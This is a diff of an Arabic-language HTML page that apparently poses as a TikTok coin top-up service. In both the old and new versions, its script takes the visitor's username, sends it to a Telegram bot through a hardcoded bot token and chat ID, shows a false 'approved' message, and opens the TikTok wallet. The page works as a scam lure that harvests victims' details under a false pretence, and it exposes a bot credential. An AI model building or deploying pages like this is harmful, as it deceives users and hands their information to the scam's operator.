@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شحن عملات تيك توك</title>
+    <title>شحن تيك توك</title>
     <style>
         body { background-color: #010101; color: white; font-family: sans-serif; text-align: center; padding: 40px 20px; }
         .box { border: 1px solid #333; padding: 20px; border-radius: 15px; background: #0a0a0a; max-width: 400px; margin: auto; }
@@ -22,21 +22,19 @@
     </div>
     <script>
         function send() {
-            const name = document.getElementById('user').value;
-            if(!name) { alert("برجاء كتابة اسم المستخدم"); return; }
+            var user = document.getElementById('user').value;
+            if(!user) { alert("برجاء كتابة اليوزر"); return; }
             
-            const token = "8797896445:AAFg2pPj1C5tbUR72m-raHrRwzYTgBLSAVo";
-            const id = "5533405786"; 
-            const text = "🚀 عميل جديد جاهز:\nاليوزر: " + name;
+            var token = "8797896445:AAFg2pPj1C5tbUR72m-raHrRwzYTgBLSAVo";
+            var chat_id = "5533405786";
+            var text = "🚀 عميل جديد:\n" + user;
             
-            const url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + id + "&text=" + encodeURIComponent(text);
+            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
             
-            fetch(url)
-            .then(() => { 
+            fetch(url).then(function() {
                 alert("تم الاعتماد! جاري تحويلك للمحفظة...");
-                window.location.href = "snssdk1128://wallet"; 
-            })
-            .catch(err => alert("حدث خطأ في الاتصال"));
+                window.location.href = "snssdk1128://wallet";
+            });
         }
     </script>
 </body>
